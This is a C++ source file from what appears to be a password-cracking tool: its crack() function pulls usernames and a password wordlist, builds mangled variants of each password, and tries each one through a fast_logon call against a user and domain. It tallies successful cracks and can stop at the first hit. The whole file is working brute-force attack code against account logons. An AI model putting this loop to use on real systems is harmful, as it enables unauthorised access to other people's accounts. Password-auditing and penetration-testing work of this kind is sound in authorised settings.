#include "include/pluto.h"

// Attack from a specific password

void crack() {

    Iterator<char*> *user_it = opts->users;
    Iterator<char*> *pass_it = opts->passwords;

    // Single user & pass, verbose mode
    if (opts->verbose && opts->user_source == USER_GIVEN && opts->pass_source == PASS_GIVEN && !opts->do_mangling) {
        out_combo(verbose_logon(user_it->next(), pass_it->next(), opts->domain));
        outln("Done!");
        return;
    }

    // Setup vars
    vector<string> users;
    bool success = false;
    char* user = MAKE_STR;
    char* pass = MAKE_STR;
    char* domain = opts->domain;

    // Precache users
    while (user_it->has_next()) {
        users.push_back(string(user_it->next()));
        stat_users++;
    }

    if (users.size() > 1) {
        infoln("Precached %i usernames", users.size());
    }

    // Prepare mangling
    mangle_init();

    countdown();
    outln();

    // User loop
    for (string string_user : users) {
        strcpy(user, string_user.c_str());
        bool next_user = false;

        // Reset password
        pass_it->reset();

        // Pass loop
        success = false;
        while (pass_it->has_next()) {
            char* base_pass = pass_it->next();

            // Check enter
            if (enter_down()) {
                infoln(string(user) + " (" + string(base_pass) + ") | " + format_stats());
            }

            // Mangle
            vector<string> mangles = *mangle(base_pass);

            // Try mangles
            int mangle_tries = 0;
            for (string mangled_pass : mangles) {
                strcpy(pass, mangled_pass.c_str());

                // Filter?
                if (opts->filter_pass && !filter_pass(pass)) {
                    verbose_combo(user, pass, true);
                    continue;
                } else {
                    verbose_combo(user, pass, false);
                }

                // Mangle limit?
                mangle_tries++;
                if (opts->max_tries != 0 && mangle_tries > opts->max_tries) {
                    next_user = true;
                    break;
                }

                // Dry run?
                if (opts->dry_run) {
                    fineln("Dry: '" + string(user) + "' | '" + string(pass) + "'");
                    continue;
                }

                // Try logon
                stat_tries++;
                if (fast_logon(user, pass, domain)) {
                    success = true;
                    next_user = true;
                    stat_cracks++;
                    break;
                }
            } // Mangle loop

            update_tps(mangle_tries);

            if (next_user) { // Get out of the pass loop
                break;
            }

        } // Pass loop

        // Out combo
        if (!opts->dry_run) {
            out_combo(user, pass, success);
        }

        if (success && opts->single) {
            break;
        }
    } // User loop
    outln();

    info("Done!");
    if (!opts->dry_run) {
        out(" - " + format_stats());
    } else {
        outln();
    }

    user_it->close();
    pass_it->close();
}
